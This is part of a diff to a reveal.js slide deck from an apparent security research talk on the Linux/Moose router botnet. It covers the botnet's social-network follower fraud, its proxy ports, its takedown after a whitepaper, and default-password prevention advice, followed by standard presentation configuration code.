+<section data-background-size="contain" data-background-image="images/proxy-usage_targets.png"><aside class="notes"><div class="paragraph"><p>To track, we followed some accounts we saw in the honeypot traffic</p></div></aside></section>
+<section id="_an_example"><h2>An Example</h2><div class="paragraph"><p><span class="image"><img src="images/fraud-example-1.png" alt="fraud example 1" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>Allowed us to find a few profiles created by the operator such as this one.</p></div>
+<div class="paragraph"><p>Pattern is &lt; 50 follows per accounts</p></div></aside></section>
+<section id="_an_example_cont"><h2>An Example (cont.)</h2><div class="paragraph"><p><span class="image"><img src="images/fraud-example-2.png" alt="fraud example 2" /></span></p></div>
+<aside class="notes">In the followed accounts</aside></section>
+<section id="_an_example_cont_2"><h2>An Example (cont.)</h2><div class="paragraph"><p><span class="image"><img src="images/fraud-example-3.png" alt="fraud example 3" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>Same account went from 3k (and I believe that the scheme already started) to
+11k with almost no posts</p></div>
+<div class="paragraph"><p>From what I know about instagram, I expect a pattern like this to be really
+rare (post / follower / following ratio)</p></div>
+<div class="paragraph"><p>Several examples we found were not SFW. On a thin line between fitness and
+porn. haha</p></div></aside></section>
+<section id="_an_example_cont_3"><h2>An Example (cont.)</h2><div class="paragraph"><p><span class="image"><img src="images/fraud-example-4.png" alt="fraud example 4" /></span></p></div></section>
+<section id="_anti_tracking"><h2>Anti-Tracking</h2><div class="ulist"><ul><li><p>Proxy access is protected by an IP-based Whitelist</p></li><li><p>So we can’t use the proxy service to evaluate malware population</p></li><li><p>Blind because of HTTPS enforced on social networks</p></li></ul></div>
+<aside class="notes"><div class="ulist"><div class="title">Building on the anti-analysis tricks</div><ul><li><p>whitelist given by C&amp;C</p></li><li><p>proxy service: port 10073</p></li><li><p>Pervasive use of HTTPS by social networks means we can’t track the operators’ actions through honeypots</p></li></ul></div></aside></section>
+<section data-background-size="contain" data-background-image="images/operation_overview.png"><aside class="notes"><div class="ulist"><ul><li><p>Stolen cookies</p></li><li><p>Social network fraud</p></li><li><p>Reproduction</p></li></ul></div></aside></section>
+<section id="_whitepaper_impact"><h2>Whitepaper Impact</h2><div class="ulist"><ul><li><p>Few weeks after the publication the C&amp;C servers went dark</p><div class="ulist"><ul><li><p>After a reboot, all affected devices should be cleaned</p></li><li><p>But victims compromised via weak credentials, so they can always reinfect</p></li></ul></div></li></ul></div>
+<aside class="notes">Reboot: due to lack of persistence</aside></section>
+<section id="_alive_or_dead"><h2>Alive or dead?</h2><div class="paragraph"><p><span class="image"><img src="images/port-10073-stats.png" alt="port 10073 stats" /></span></p></div>
+<aside class="notes">Port 10073 activity</aside></section>
+<section id="_yay_except"><h2>Yay! Except&#8230;&#8203;</h2><div class="paragraph"><p><span class="image"><img src="images/champagne-celebration.gif" alt="champagne celebration" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>but of course things must happen to mess with your talk</p></li></ul></div></aside></section>
+<section id="_linux_moose_update"><h2>Linux/Moose Update</h2><div class="paragraph"><p>New sample in September</p></div>
+<div class="ulist"><ul><li><p>New proxy service port (20012)</p></li><li><p>New C&amp;C selection algorithm</p></li><li><p>Few differences</p></li><li><p>Still under scrutiny</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>and we are careful, we don&#8217;t want to rely on strings ;)</p></div></aside></section>
+<section><div class="paragraph"><p><span class="image"><img src="images/port-20012-stats_v3.png" alt="port 20012 stats v3" /></span></p></div></section>
+<section data-background-size="contain" data-background-image="images/port-activity_201604.png"></section>
+<section id="_stay_tuned"><h2>Stay tuned</h2><div class="paragraph"><p>But more on this botnet in another presentation!</p></div>
+<aside class="notes"><div class="paragraph"><p>We can&#8217;t publicly say what we are doing just yet otherwise we will tip off
+the operators.</p></div></aside></section>
+<section id="_conclusion"><h2>Conclusion</h2><div class="paragraph"><p>Embedded malware</p></div>
+<div class="ulist"><ul><li><p>Not yet complex</p></li><li><p>Tools and processes need to catch up</p></li><li><p>A low hanging fruit</p></li><li><p>Prevention simple</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Threats are not as advanced or complex as their Windows counterparts</p></li><li><p>Our tools, visibility and processes will need to be improved</p></li><li><p>Routers and IoT industry are a low hanging fruit for malware operators these days</p></li></ul></div></aside></section>
+<section id="_prevention" data-state="white" data-background-size="cover" data-background-image="images/prevention.jpg"><h2>Prevention</h2></section>
+<section id="_prevention_2"><h2>Prevention</h2><div class="ulist"><ul><li class="fragment"><p>Change default passwords! <span class="image right"><img src="images/router-pass-changed.jpg" alt="router pass changed" width="300" /></span></p></li><li class="fragment"><p>even of your friends' routers!</p></li><li class="fragment"><p>until the next shellshock &#8230;&#8203;</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Friends don’t let friends run routers with default credentials</p></li><li><p>you have to understand the threat model: remote attackers not local ones!</p></li><li><p>That is, until there is another shellshock affecting all Linux-based
+routers&#8230;&#8203;</p></li></ul></div></aside></section>
+<section id="_thanks"><h2>Thanks!</h2><div class="ulist"><ul><li><p>Thank you!</p></li><li><p>Special thanks to ESET Canada Research Team</p></li></ul></div></section>
+<section id="_questions" data-background="#000000"><h2>Questions?</h2><div class="listingblock oversize4"><div class="content"><pre class="highlight"><code>@obilodeau
+@nyx__o</code></pre></div></div></section></div></div><script src="reveal.js/lib/js/head.min.js"></script><script src="reveal.js/js/reveal.js"></script><script>// See https://github.com/hakimel/reveal.js#configuration for a full list of configuration options
+Reveal.initialize({
+  // Display controls in the bottom right corner
+  controls: false,
+  // Display a presentation progress bar
+  progress: true,
+  // Display the page number of the current slide
+  slideNumber: false,
+  // Push each slide change to the browser history
+  history: true,
+  // Enable keyboard shortcuts for navigation
+  keyboard: true,
+  // Enable the slide overview mode
+  overview: true,
+  // Vertical centering of slides
+  center: true,
+  // Enables touch navigation on devices with touch input
+  touch: true,
+  // Loop the presentation
+  loop: false,
+  // Change the presentation direction to be RTL
+  rtl: false,
+  // Turns fragments on and off globally
+  fragments: true,
+  // Flags if the presentation is running in an embedded mode,
+  // i.e. contained within a limited portion of the screen
+  embedded: false,
+  // Number of milliseconds between automatically proceeding to the
+  // next slide, disabled when set to 0, this value can be overwritten
+  // by using a data-autoslide attribute on your slides
+  autoSlide: 0,
+  // Stop auto-sliding after user input
+  autoSlideStoppable: true,
+  // Enable slide navigation via mouse wheel
+  mouseWheel: false,
+  // Hides the address bar on mobile devices
+  hideAddressBar: true,
+  // Opens links in an iframe preview overlay
+  previewLinks: false,
+  // Theme (e.g., beige, black, blood, league, moon, night, serif, simple, sky, solarized, white)
+  // NOTE setting the theme in the config no longer works in reveal.js 3.x
+  //theme: Reveal.getQueryHash().theme || 'neutral',
+  // Transition style (e.g., none, fade, slide, convex, concave, zoom)
+  transition: Reveal.getQueryHash().transition || 'none',
+  // Transition speed (e.g., default, fast, slow)
+  transitionSpeed: 'default',
+  // Transition style for full page slide backgrounds (e.g., none, fade, slide, convex, concave, zoom)
+  backgroundTransition: 'slide',
+  // Number of slides away from the current that are visible
+  viewDistance: 3,
+  // Parallax background image (e.g., "'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg'")
+  parallaxBackgroundImage: '',
+  // Parallax background size in CSS syntax (e.g., "2100px 900px")
+  parallaxBackgroundSize: '',
+
+  // The "normal" size of the presentation, aspect ratio will be preserved
+  // when the presentation is scaled to fit different resolutions. Can be
+  // specified using percentage units.
+  width: 960,
+  height: 700,
+
+  // Factor of the display size that should remain empty around the content
+  margin: 0.01,
+
+  // Bounds for smallest/largest possible scale to apply to content
+  minScale: 0.2,
+  maxScale: 2,
+
+  // Optional libraries used to extend on reveal.js
+  dependencies: [
+      { src: 'reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+      { src: 'reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+      { src: 'reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+      { src: 'reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+      { src: 'reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+      { src: 'reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+  ]
+});</script></body></html>
